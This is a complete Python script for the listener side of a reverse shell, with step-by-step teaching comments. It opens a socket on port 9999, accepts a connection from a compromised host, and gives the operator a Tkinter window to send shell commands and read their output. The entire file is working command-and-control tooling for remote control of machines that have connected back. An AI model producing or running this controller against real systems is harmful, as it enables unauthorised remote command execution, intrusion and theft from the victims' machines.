#!/usr/bin/env python3
"""
Reverse Shell Server with a GUI Interface
-------------------------------------------
This server listens for an incoming reverse connection and provides a simple
GUI (using Tkinter) to send commands and display output.
"""

import socket
import threading
import tkinter as tk
from tkinter import scrolledtext
import sys

# Configuration
HOST = ''    # Listen on all available interfaces
PORT = 9999  # Port for incoming connections

class ReverseShellGUI:
    def __init__(self, master):
        self.master = master
        master.title("Reverse Shell Controller")

        # A scrollable text area to display output from the client
        self.output_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=80, height=20)
        self.output_area.pack(padx=10, pady=10)

        # An entry widget to type commands
        self.entry = tk.Entry(master, width=80)
        self.entry.pack(padx=10, pady=(0,10))
        # Bind the "Enter" key to send commands
        self.entry.bind("<Return>", self.send_command)

        # A button to send commands
        self.send_button = tk.Button(master, text="Send", command=self.send_command)
        self.send_button.pack(pady=(0,10))

        # Step 1: Creating a Socket
        # Explanation: We create a new TCP socket (IPv4) for the server.
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Step 2: Binding the Socket and Listening
            # Explanation: We bind the socket to a host/port and start listening for connections.
            self.server_socket.bind((HOST, PORT))
            self.server_socket.listen(1)
            self.write_output(f"[*] Listening on port {PORT}...\n")
        except socket.error as e:
            self.write_output(f"[!] Socket error: {e}\n")
            sys.exit(1)

        self.conn = None
        self.addr = None

        # Start a background thread that will accept a connection
        threading.Thread(target=self.accept_connection, daemon=True).start()

    def write_output(self, message):
        """
        Insert a message into the output area and auto-scroll to the end.
        """
        self.output_area.insert(tk.END, message)
        self.output_area.see(tk.END)

    def accept_connection(self):
        """
        Step 3: Accepting Connections
        Explanation: The server blocks until a client connects.
        """
        try:
            self.conn, self.addr = self.server_socket.accept()
            self.write_output(f"[*] Connection established from {self.addr[0]}:{self.addr[1]}\n")

            # Once connected, start a background thread to continuously receive data
            threading.Thread(target=self.receive_data, daemon=True).start()
        except Exception as e:
            self.write_output(f"[!] Error accepting connection: {e}\n")

    def receive_data(self):
        """
        Continuously receive data from the client and display it in the GUI.
        """
        while True:
            try:
                data = self.conn.recv(4096)
                if not data:
                    self.write_output("[*] Connection closed by the remote host.\n")
                    break
                decoded = data.decode('utf-8', errors='ignore')
                self.write_output(decoded)
            except Exception as e:
                self.write_output(f"[!] Error receiving data: {e}\n")
                break

    def send_command(self, event=None):
        """
        Step 4: Sending Commands to the Client
        Explanation: The server user can type commands which are sent to the client.
        """
        if self.conn:
            cmd = self.entry.get().strip()
            if cmd:
                try:
                    self.conn.send(cmd.encode('utf-8'))
                    self.write_output(f"\n[>] {cmd}\n")
                except Exception as e:
                    self.write_output(f"[!] Failed to send command: {e}\n")
                self.entry.delete(0, tk.END)

                if cmd.lower() == "quit":
                    self.conn.close()
                    self.server_socket.close()
                    self.master.quit()
        else:
            self.write_output("[!] No client connected yet.\n")

if __name__ == '__main__':
    root = tk.Tk()
    gui = ReverseShellGUI(root)
    root.mainloop()
